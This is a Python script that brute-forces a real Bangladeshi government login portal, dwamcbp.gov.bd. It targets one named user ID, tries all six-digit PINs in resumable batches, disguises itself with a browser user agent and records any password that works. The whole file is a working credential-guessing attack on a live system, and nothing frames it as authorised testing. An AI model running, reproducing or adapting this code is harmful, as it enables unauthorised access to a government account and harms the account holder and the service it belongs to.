import os
import re
import time
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

LOGIN_URL = "https://dwamcbp.gov.bd/mcbp/login?lang=en"
USER_ID = "uwao.Gaibandhasadar"

START_NUM = int(os.environ.get("START_PIN", "0"))
END_NUM = int(os.environ.get("END_PIN", "999999"))
MAX_STEPS = int(os.environ.get("MAX_STEPS", "25000"))

PROGRESS_FILE = "progress/last_pin.txt"
FOUND_FILE = "found/mcbp_found_pass.txt"
MORE_NEEDED_FILE = "progress/more_needed.txt"

UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "Chrome/120.0.0.0 Safari/537.36"
)


def read_last_pin() -> int | None:
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, "r", encoding="utf-8") as f:
            raw = f.read().strip()
        if raw.isdigit():
            return int(raw)
    return None


def write_last_pin(num: int):
    os.makedirs(os.path.dirname(PROGRESS_FILE), exist_ok=True)
    with open(PROGRESS_FILE, "w", encoding="utf-8") as f:
        f.write(str(num))


def write_more_needed(needed: bool):
    os.makedirs(os.path.dirname(MORE_NEEDED_FILE), exist_ok=True)
    with open(MORE_NEEDED_FILE, "w", encoding="utf-8") as f:
        f.write("1" if needed else "0")


def save_found(uid: str, pin: str, final_url: str, snippet: str):
    os.makedirs(os.path.dirname(FOUND_FILE), exist_ok=True)
    with open(FOUND_FILE, "a", encoding="utf-8") as f:
        f.write(f"User ID: {uid} | Password: {pin} | URL: {final_url}\n")
        f.write(f"Info: {snippet}\n")
        f.write("-" * 50 + "\n")


def find_login_fields(form):
    payload = {}
    user_field = None
    pass_field = None

    for inp in form.find_all(["input", "select", "textarea"]):
        name = inp.get("name")
        if not name:
            continue
        itype = (inp.get("type") or "").lower()
        low_name = name.lower()

        if itype in ("hidden", "checkbox", "radio"):
            payload[name] = inp.get("value", "")
        elif itype == "password" or any(k in low_name for k in ["pass", "pwd", "pin"]):
            if not pass_field:
                pass_field = name
        elif any(k in low_name for k in ["user", "login", "email", "id", "mobile", "phone", "username"]):
            if not user_field:
                user_field = name
        elif itype in ("text", "") and not user_field:
            user_field = name

    return payload, user_field or "username", pass_field or "password"


def is_login_success(resp: requests.Response, soup: BeautifulSoup) -> bool:
    cur_url = resp.url.lower()
    if "login" not in cur_url and resp.status_code == 200:
        if not soup.find("input", {"type": "password"}):
            return True

    text = soup.get_text(" ", strip=True).lower()
    success_markers = ["dashboard", "logout", "sign out", "welcome", "profile"]
    fail_markers = [
        "invalid", "incorrect", "wrong", "failed", "not match",
        "credentials", "try again", "ভুল", "সঠিক নয়"
    ]

    if any(m in text for m in fail_markers):
        return False
    if any(m in text for m in success_markers) and not soup.find("input", {"type": "password"}):
        return True

    return False


def main():
    last_pin = read_last_pin()
    current_start = (last_pin + 1) if last_pin is not None else START_NUM
    if current_start < START_NUM:
        current_start = START_NUM

    if current_start > END_NUM:
        print("সব PIN চেক শেষ হয়েছে।")
        write_more_needed(False)
        return

    upper_bound = min(END_NUM, current_start + MAX_STEPS - 1)
    print(f"Checking {USER_ID} from {current_start:06d} to {upper_bound:06d} (Target end: {END_NUM:06d})")

    session = requests.Session()
    session.headers.update({"User-Agent": UA})

    found_any = False
    last_checked = current_start - 1

    for num in range(current_start, upper_bound + 1):
        pin = f"{num:06d}"
        last_checked = num

        try:
            r = session.get(LOGIN_URL, timeout=25)
            r.raise_for_status()
            soup = BeautifulSoup(r.text, "html.parser")
            form = soup.find("form")

            if form:
                payload, u_field, p_field = find_login_fields(form)
                payload[u_field] = USER_ID
                payload[p_field] = pin

                action_url = urljoin(r.url, form.get("action") or LOGIN_URL)
                resp = session.post(
                    action_url,
                    data=payload,
                    headers={"Referer": r.url},
                    timeout=25,
                    allow_redirects=True,
                )
                resp_soup = BeautifulSoup(resp.text, "html.parser")
                if is_login_success(resp, resp_soup):
                    snippet = re.sub(r"\s+", " ", resp_soup.get_text(" ", strip=True))[:220]
                    print(f"[SUCCESS] User ID: {USER_ID} | Password: {pin}")
                    save_found(USER_ID, pin, resp.url, snippet)
                    found_any = True
                    break

        except requests.RequestException:
            time.sleep(1.5)
        except Exception:
            pass

        time.sleep(0.2)

    write_last_pin(last_checked)
    more_needed = (not found_any) and (last_checked < END_NUM)
    write_more_needed(more_needed)
    print(f"Batch finished at {last_checked:06d}. More needed: {more_needed}")


if __name__ == "__main__":
    main()
